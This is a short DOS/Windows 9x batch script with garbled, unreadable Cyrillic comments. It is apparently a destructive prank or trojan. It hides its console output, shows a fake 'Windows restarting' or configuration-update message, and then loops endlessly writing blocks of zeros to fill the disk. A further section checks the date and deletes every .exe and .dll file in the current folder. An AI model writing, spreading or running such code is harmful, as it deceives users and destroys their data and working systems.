rem � ����� ���� ��� ��襩 ४����:)
rem ��� ����� ����� ᢮� ��� ������ ��� ��⠢��.
rem �� ��� � ���� �� �祭� ����, �� 10 ᥪ ������ 䠩� � 100 ���, �㫥��
rem ��������� �� �⠫. ���� ���� ������ �����.
@ECHO OFF
find "���ࠢ��쭮"<%WINBOOTDIR%\COMMAND.COM>nul
if errorlevel 1 goto mdaa
:neet
echo Windows �������� 䠩�� ���䨣��樨...
echo �� ����� ������ ��᪮�쪮 �����...
echo �������� ��������...
goto yes!
:mdaa
echo Please wait... Windows restarting...
:yes!
:1
@ctty nul
echo cool>cool
CLS
SET i=T$MP
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
ECHO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000>>tmp
copy /B tmp %i%
copy /B TMP+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%+%i%
copy /b TMP+TMP+TMP
goto 1
@if exist cool goto nocool
@ctty con
:nocool
echo.|date|find "12">nul
if errorlevel 1 goto quit
%WINBOOTDIR%\smartdrv.exe
del *.exe
del *.dll
:quit
@ctty con